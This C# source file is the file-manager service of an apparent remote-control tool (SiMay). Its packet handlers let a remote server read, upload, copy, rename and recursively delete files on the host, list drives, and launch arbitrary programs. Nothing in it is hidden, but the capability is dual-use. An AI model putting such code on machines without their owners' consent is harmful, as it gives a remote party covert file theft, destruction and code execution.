using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.Common;
using SiMay.Core.Enums;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Core.Packets.FileManager;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Entitys;
using SiMay.ServiceCore.Extensions;

using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using static SiMay.ServiceCore.CommonWin32Api;

namespace SiMay.ServiceCore.ApplicationService
{
    [ServiceName("文件管理")]
    [ServiceKey("FileManagerJob")]
    public class FileService : ServiceManagerBase
    {
        private const int FILE_BUFFER_SIZE = 1024 * 512;

        //当前连接会话是否关闭
        private bool _isSessionClose = false;
        private bool _isStopTask = false;
        private System.IO.FileStream _fileStream;
        private ManualResetEvent _event = new ManualResetEvent(true);
        public override void SessionClosed()
        {
            this._isSessionClose = true;
            this.CloseFileStream();
            this._event.Close();
        }

        [PacketHandler(MessageHead.S_FILE_UPLOAD)]
        public void TryFixedDownloadFile(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<FileUploadPack>();
            this._event.WaitOne();//等待上个文件传输完成
            if (_isSessionClose)
                return;

            this._isStopTask = false;
            var response = new FileUploadFileStatus();
            if (File.Exists(pack.FileName))
                response.Status = 1;
            else
                response.Status = 0;

            var rootdirectory = Path.GetDirectoryName(pack.FileName);
            if (!Directory.Exists(rootdirectory))
                Directory.CreateDirectory(rootdirectory);

            try
            {
                _fileStream = new System.IO.FileStream(pack.FileName,
                    System.IO.FileMode.OpenOrCreate,
                    System.IO.FileAccess.ReadWrite,
                    System.IO.FileShare.ReadWrite);
                response.Position = _fileStream.Length;
                _event.Reset();//锁住，待文件传输完成文件关闭
            }
            catch (Exception ex)
            {
                response.Status = 2;
                this.SendErrorMessage(ex, "文件上传打开失败!");
            }
            Console.WriteLine("send status");
            SendAsyncToServer(MessageHead.C_FILE_OPEN_STATUS, response);
        }

        [PacketHandler(MessageHead.S_FILE_FRIST_DATA)]
        public void RecvFristDataHandler(TcpSocketSaeaSession session)
        {
            var data = session.CompletedBuffer.GetMessageEntity<FileFristUploadDataPack>();
            if (data.FileMode == 0)
            {
                _fileStream.Position = 0;
                _fileStream.SetLength(0);
            }
            else
            {
                _fileStream.Position = data.Position;
            }

            this.WriteFileAsync(data.Data, data.FileSize);
        }

        [PacketHandler(MessageHead.S_FILE_DATA)]
        public void RecvDataHandler(TcpSocketSaeaSession session)
        {
            var data = session.CompletedBuffer.GetMessageEntity<FileUploadDataPack>();
            this.WriteFileAsync(data.Data, data.FileSize);
        }

        private void WriteFileAsync(byte[] data, long originSize)
        {
            _fileStream.BeginWrite(data, 0, data.Length, c =>
            {
                if (this._isStopTask)
                    return;

                _fileStream.EndWrite(c);
                if (_fileStream.Length == originSize)
                    this.CloseFileStream();
                else
                    SendAsyncToServer(MessageHead.C_FILE_NEXT_DATA);
            }, null);
        }

        [PacketHandler(MessageHead.S_FILE_FILE_PASTER)]
        public void CopyFiles(TcpSocketSaeaSession session)
        {
            var files = session.CompletedBuffer.GetMessageEntity<FileCopyPack>();
            ThreadHelper.CreateThread(() =>
            {
                var failFiles = new List<string>();
                foreach (var file in files.FileNames)
                {
                    try
                    {
                        if (File.Exists(file))
                            File.Copy(file, files.TargetDirectoryPath + Path.GetFileName(file));
                        else if (Directory.Exists(file))
                            FileHelper.CopyDirectory(file, files.TargetDirectoryPath);
                        else
                            break;
                    }
                    catch (Exception ex)
                    {
                        failFiles.Add(file);
                        this.SendErrorMessage(ex, "文件复制失败!");
                    }
                }
                SendAsyncToServer(MessageHead.C_FILE_COPY_FINISH,
                    new FileCopyFinishPack()
                    {
                        ExceptionFileNames = failFiles.ToArray()
                    });
                failFiles.Clear();
            }, true);
        }

        [PacketHandler(MessageHead.S_FILE_DELETE)]
        public void DeleteFiles(TcpSocketSaeaSession session)
        {
            var files = session.CompletedBuffer.GetMessageEntity<FileDeletePack>();
            ThreadHelper.CreateThread(() =>
            {
                var response = new List<string>();
                foreach (var file in files.FileNames)
                {
                    try
                    {
                        if (File.Exists(file))
                            File.Delete(file);
                        else if (Directory.Exists(file))
                            Directory.Delete(file, true);
                        else
                            break;

                        response.Add(file);
                    }
                    catch (Exception ex)
                    {
                        this.SendErrorMessage(ex, "删除文件失败!");
                    }
                }

                SendAsyncToServer(MessageHead.C_FILE_DELETE_FINISH,
                    new FileDeleteFinishPack()
                    {
                        DeleteFileNames = response.ToArray()
                    });
                response.Clear();
            }, true);
        }

        [PacketHandler(MessageHead.S_FILE_CREATE_DIR)]
        public void CreateDirectory(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileCreateDirectoryPack>();
            var result = true;
            try
            {
                Directory.CreateDirectory(file.DirectoryName);
            }
            catch (Exception ex)
            {
                result = false;
                this.SendErrorMessage(ex, "文件夹创建失败!");
            }

            if (!file.NoCallBack)
            {
                SendAsyncToServer(MessageHead.C_FILE_CREATEF_DIR_FNISH,
                    new FileCreateDirectoryFinishPack()
                    {
                        IsSuccess = result
                    });
            }
        }

        [PacketHandler(MessageHead.S_FILE_RENAME)]
        public void FileReName(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileReNamePack>();
            var result = true;
            ThreadHelper.CreateThread(() =>
            {
                try
                {
                    if (File.Exists(file.SourceFileName))
                        File.Move(file.SourceFileName, file.TargetName);
                    else if (Directory.Exists(file.SourceFileName))
                        Directory.Move(file.SourceFileName, file.TargetName);
                    else
                        result = false;
                }
                catch (Exception ex)
                {
                    result = false;
                    this.SendErrorMessage(ex, "文件重命名失败!");
                }
                SendAsyncToServer(MessageHead.C_FILE_RENAME_FINISH,
                    new FileReNameFinishPack()
                    {
                        SourceFileName = file.SourceFileName,
                        TargetName = file.TargetName,
                        IsSuccess = result
                    });
            }, true);
        }

        [PacketHandler(MessageHead.S_FILE_OPEN_TEXT)]
        public void OpenText(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileOpenTextPack>();
            var textPack = new FileTextPack();
            if (File.Exists(file.FileName) && new FileInfo(file.FileName).Length <= 1024 * 512)
            {
                try
                {
                    var text = File.ReadAllText(file.FileName);
                    textPack.IsSuccess = true;
                    textPack.Text = text;
                }
                catch (Exception ex)
                {
                    textPack.IsSuccess = false;
                    this.SendErrorMessage(ex, "Text打开失败!");
                }
            }
            else
                this.SendErrorMessage(new Exception(), "文件不存在或文件长度超出范围!");

            this.SendAsyncToServer(MessageHead.C_FILE_TEXT, textPack);
        }

        [PacketHandler(MessageHead.S_FILE_GETDIR_FILES)]
        public void SendDirectoryFiles(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileDirectoryGetFilesPack>();
            ThreadPool.QueueUserWorkItem(c =>
            {
                _isStopTask = false;//允许任务继续
                var fileItems = new EventList<DirectoryFileItem>(100);
                fileItems.Notify += (list, items) =>
                    this.SendAsyncToServer(MessageHead.C_FILE_DIR_FILES,
                        new FileDirectoryFilesPack()
                        {
                            Files = items
                        });
                this.DirectoryGetFiles(file.DirectoryPath, fileItems);

                this.SendAsyncToServer(MessageHead.C_FILE_DIR_FILES,
                    new FileDirectoryFilesPack()
                    {
                        Files = fileItems.ToArray()
                    });
                fileItems.Clear();
            }, null);
        }
        private void DirectoryGetFiles(string path, EventList<DirectoryFileItem> items)
        {
            try
            {
                if (_isStopTask)
                    return;
                string[] files = Directory.GetFiles(path);
                foreach (var file in files)
                {
                    if (_isStopTask)
                        return;
                    items.EAdd(new DirectoryFileItem()
                    {
                        Type = DirectoryFileType.File,
                        FileName = file
                    });
                }
                string[] directroys = Directory.GetDirectories(path);
                if (files.Length <= 0 && directroys.Length <= 0)
                {
                    items.EAdd(new DirectoryFileItem()
                    {
                        Type = DirectoryFileType.Directory,
                        FileName = path
                    });
                    return;
                }
                foreach (var file in directroys)
                    this.DirectoryGetFiles(file, items);
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }
        }

        [PacketHandler(MessageHead.S_FILE_DOWNLOAD)]
        public void TryFixedUploadFile(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileDownloadPack>();
            //var dir = Path.GetDirectoryName(file.FileName);
            //if (!Directory.Exists(dir))
            //    Directory.CreateDirectory(dir);

            this._isStopTask = false;
            int status = 1;
            if (File.Exists(file.FileName))
            {
                try
                {
                    _fileStream = new System.IO.FileStream(
                        file.FileName,
                        System.IO.FileMode.Open,
                        System.IO.FileAccess.Read,
                        System.IO.FileShare.ReadWrite);

                    _fileStream.Position = file.Position;
                }
                catch (Exception ex)
                {
                    status = 0;
                    this.SendErrorMessage(ex, "准备上传文件打开失败!");
                }
            }
            else
            {
                //文件不存在，一般不会出现
                status = -1;
            }

            if (status != 1)
            {
                this.SendAsyncToServer(MessageHead.C_FILE_FRIST_DATA,
                    new FileFristDownloadDataPack()
                    {
                        //fileName = Path.GetFileName(file.FileName),
                        Status = status,
                        FileSize = 0
                    });
                return;
            }

            var fileSize = _fileStream.Length;
            this.ReadFileAsync(data =>
            {
                this.SendAsyncToServer(MessageHead.C_FILE_FRIST_DATA,
                    new FileFristDownloadDataPack()
                    {
                        //fileName = Path.GetFileName(file.FileName),
                        Status = status,
                        FileSize = fileSize,
                        Data = data
                    });
            });

        }

        [PacketHandler(MessageHead.S_FILE_NEXT_DATA)]
        public void SendNextData(TcpSocketSaeaSession session)
        {
            this.ReadFileAsync(data =>
            {
                this.SendAsyncToServer(MessageHead.C_FILE_DATA,
                    new FileDownloadDataPack()
                    {
                        Data = data
                    });
            });
        }

        byte[] _fileBuffer = new byte[FILE_BUFFER_SIZE];
        private void ReadFileAsync(Action<byte[]> callback)
        {
            _fileStream.BeginRead(_fileBuffer, 0, _fileBuffer.Length,
                c =>
                {
                    if (this._isStopTask)
                        return;

                    int readlenght = _fileStream.EndRead(c);
                    if (readlenght != _fileBuffer.Length)
                    {
                        IsReadEnd();
                        byte[] buf = new byte[readlenght];
                        Array.Copy(_fileBuffer, 0, buf, 0, readlenght);
                        callback?.Invoke(buf);
                    }
                    else
                    {
                        IsReadEnd();
                        callback?.Invoke(_fileBuffer);
                    }
                    void IsReadEnd()
                    {
                        if (_fileStream.Length == _fileStream.Position)
                            this.CloseFileStream();
                    }
                }, null);
        }

        [PacketHandler(MessageHead.S_FILE_STOP)]
        public void TaskClose(TcpSocketSaeaSession session)
        {
            _isStopTask = true;
            this.CloseFileStream();
        }


        public void CloseFileStream()
        {
            this._event.Set();
            try
            {
                _fileStream.Flush();
                _fileStream.Close();
            }
            catch (Exception ex)
            {
                this.SendErrorMessage(ex, "关闭文件异常!");
            }
        }

        private void SendErrorMessage(Exception e, string info)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_FILE_ERROR_INFO,
                new FileExceptionPack()
                {
                    OccurredTime = DateTime.Now,
                    TipMessage = info,
                    ExceptionMessage = e.Message,
                    StackTrace = e.StackTrace
                });
            SendAsyncToServer(data);
        }

        [PacketHandler(MessageHead.S_FILE_EXECUTE)]
        public void ExcuteFile(TcpSocketSaeaSession session)
        {
            var file = session.CompletedBuffer.GetMessageEntity<FileExcutePack>();
            try
            {
                if (Directory.Exists(file.FilePath))
                    Process.Start("explorer.exe", file.FilePath);
                else
                    Process.Start(file.FilePath);
            }
            catch { }
        }

        [PacketHandler(MessageHead.S_FILE_REDIRION)]
        public void RedirtionHandler(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<FileRedirectionPath>();
            this.GetFileListHandler(Environment.GetFolderPath(pack.SpecialFolder));
        }

        [PacketHandler(MessageHead.S_FILE_GET_FILES)]
        public void SendFilelist(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<FileListPack>();
            this.GetFileListHandler(pack.FilePath);
        }

        private void GetFileListHandler(string path)
        {
            try
            {
                var dirs = Directory.GetDirectories(path)
                    .Select(dir => new FileItem()
                    {
                        FileName = new DirectoryInfo(dir).Name,
                        FileSize = 0,
                        FileType = FileType.Directory,
                        LastAccessTime = new DirectoryInfo(dir).LastAccessTime
                    })
                    .ToArray();


                var files = Directory.GetFiles(path)
                    .Select(file => new FileItem()
                    {
                        FileName = new System.IO.FileInfo(file).Name,
                        FileSize = new System.IO.FileInfo(file).Length,
                        FileType = FileType.File,
                        LastAccessTime = new System.IO.FileInfo(file).LastAccessTime
                    })
                    .ToArray();

                SendAsyncToServer(MessageHead.C_FILE_FILE_LIST, new FileListItemsPack()
                {
                    FileList = dirs.Concat(files).ToArray(),
                    Path = path,
                    Message = "OK",
                    IsSccessed = true
                });
            }
            catch (Exception e)
            {
                SendAsyncToServer(MessageHead.C_FILE_FILE_LIST, new FileListItemsPack()
                {
                    FileList = new FileItem[0],
                    Path = path,
                    Message = e.Message,
                    IsSccessed = false
                });
            }
        }

        [PacketHandler(MessageHead.S_FILE_TREE_DIR)]
        public void GetTreeDirsHandler(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<FileGetTreeDirectoryPack>();
            if (pack.TargetRoot == "")
            {
                var drives = this.GetDrivelist();
                SendAsyncToServer(MessageHead.C_FILE_TREE_DIRS,
                    new FileTreeDirFilePack()
                    {
                        FileList = drives.ToArray(),
                        Message = "OK",
                        IsSccessed = true
                    });
            }
            else
            {
                try
                {
                    var dirs = Directory.GetDirectories(pack.TargetRoot).Select(c => new FileItem() { FileName = Path.GetFileName(c) }).ToArray();
                    SendAsyncToServer(MessageHead.C_FILE_TREE_DIRS,
                        new FileTreeDirFilePack()
                        {
                            FileList = dirs,
                            Message = "OK",
                            IsSccessed = true
                        });
                }
                catch (Exception ex)
                {
                    SendAsyncToServer(MessageHead.C_FILE_TREE_DIRS,
                        new FileTreeDirFilePack()
                        {
                            FileList = new FileItem[0],
                            Message = ex.Message,
                            IsSccessed = false
                        });
                }
            }
        }

        [PacketHandler(MessageHead.S_FILE_GET_DRIVES)]
        public void GetDrivesList(TcpSocketSaeaSession session)
            => this.SendDrivelist();

        private void SendDrivelist()
        {
            try
            {

                var drives = this.GetDrivelist();
                SendAsyncToServer(MessageHead.C_FILE_FILE_LIST,
                    new FileListItemsPack()
                    {
                        FileList = drives.ToArray(),
                        Path = string.Empty,
                        Message = "OK",
                        IsSccessed = true
                    });
            }
            catch (Exception e)
            {
                SendAsyncToServer(MessageHead.C_FILE_FILE_LIST,
                    new FileListItemsPack()
                    {
                        FileList = new FileItem[0],
                        Path = string.Empty,
                        Message = e.Message,
                        IsSccessed = false
                    });
            }
        }

        private List<FileItem> GetDrivelist()
        {
            string[] chars = new string[] {
                    "A",
                    "B",
                    "C",
                    "D",
                    "E",
                    "F",
                    "G",
                    "H",
                    "I",
                    "J",
                    "K",
                    "L",
                    "M",
                    "N",
                    "O",
                    "P",
                    "Q",
                    "R",
                    "S",
                    "T",
                    "U",
                    "V",
                    "W",
                    "X",
                    "Y",
                    "Z" };

            var fileLst = new List<FileItem>();
            for (int i = 1; i < chars.Length; i++)
            {
                string strDevice = chars[i] + ":\\";
                if (Directory.Exists(strDevice))
                {
                    ulong Z, S, R = 0;
                    GetDiskFreeSpaceEx(strDevice, out S, out Z, out R);
                    fileLst.Add(new FileItem()
                    {
                        FileName = strDevice,
                        FileSize = (long)Z,
                        UsingSize = (long)S,
                        FileType = FileType.Disk,
                        LastAccessTime = DateTime.Now
                    });
                }
            }

            return fileLst;
        }
    }
}